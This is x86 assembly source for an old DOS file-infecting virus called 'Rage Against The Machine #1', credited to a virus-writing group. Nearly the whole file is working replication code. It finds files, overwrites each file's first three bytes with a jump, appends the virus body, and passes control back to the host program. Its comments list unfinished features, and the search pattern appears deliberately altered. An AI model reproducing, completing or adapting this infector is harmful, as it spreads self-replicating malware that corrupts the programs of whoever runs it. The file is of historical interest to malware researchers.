; Rage Against The Machine #1 - Saruman / DFR Viral Laboratories
;
; BEWARE! Add BP+ to alla FILE/BUF accesses!
;
; Specifics: Non-Res .COM Infector
;
; To Do:
;  Check filesize
;  Fix file attribute problems (save/restore)
;

.model tiny
.code
.radix 16

include fileattr.inc

VirusSize   equ  END_OF_VIRUS - MAIN
EntryOfs    equ  STARTCODE - MAIN - 3

            org 100

main:       jmp startcode
ver         db 1

db          026d,'Rage Against The Machine'
ORGHEADER   db 0cdh,020h,090h

process_victim:

            mov ax,3d02
            lea dx,bp+filename
            int 21                           ;Open file r/w

            mov [FILE],ax                    ;save the handle

            mov bx,ax
            mov ah,3f
            mov cx,3
            lea dx,bp+ORGHEADER
            int 21                           ;Read first 3 bytes & store them

            mov ax,word ptr [bp+file_size]   ;Calculate jmp-header
            add ax,ENTRYOFS
            mov byte ptr [bp+BUF],0E9h       ; E9 = opcode for JMP
            mov word ptr [bp+BUF+1],ax       ; ax = filesize+offset into virus

            mov ax,4200
            mov bx,FILE
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to beginning of file
         
            mov ah,40
            mov bx,FILE
            mov cx,3
            lea dx,bp+BUF
            int 21                           ;Write JMP to header

            mov ax,4202
            mov bx,FILE
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to end of file

            mov ah,40
            mov bx,FILE
            mov cx,VIRUSSIZE
            lea dx,bp+main
            int 21                           ;Write virus body

            mov ah,3e
            mov bx,FILE
            int 21                           ;Close file

            ret


startcode:
            call nextline
nextline:
            pop bp
            sub bp,offset nextline

            mov di,100                        ;Recreate header
            lea si,bp+orgheader
            cld
            movsw
            movsb

; now.. let's see....

            mov ah,1a
            lea dx,bp+dta
            int 21                            ;Setup DTA area

            mov ah,4e
            mov cx,anyfile-hidden-readonly
            lea dx,bp+wildcard
            int 21                            ;Find First

            jc exit

findnext:
            call process_victim               ;do for every file found.
            mov ah,4f
            int 21                            ;Find Next
            jnc findnext
           
            
exit:
            mov     ah,1ah                    ;ReSet DTA address ...
            mov     dx,80h                    ;... to default DTA
            int     21h
            xor     ax,ax                     ;Reset all regs
            mov     bx,ax
            mov     cx,ax
            mov     dx,ax
            mov     si,ax
            mov     di,ax
            mov     sp,0FFFEh                 ;SP= 0
            mov     bp,100h                   ;BP= 100h (RETurn addr)
            push    bp                        
            mov     bp,0                      
            ret                               ;return to 100h

wildcard:   db '*.!!!',0

END_OF_VIRUS:

file        dw ?                              ;file handle
BUF         db ?,?,?                          ;buffer for creating jmp-hdr
include     dta.inc                           ;DTA Structure

end	main
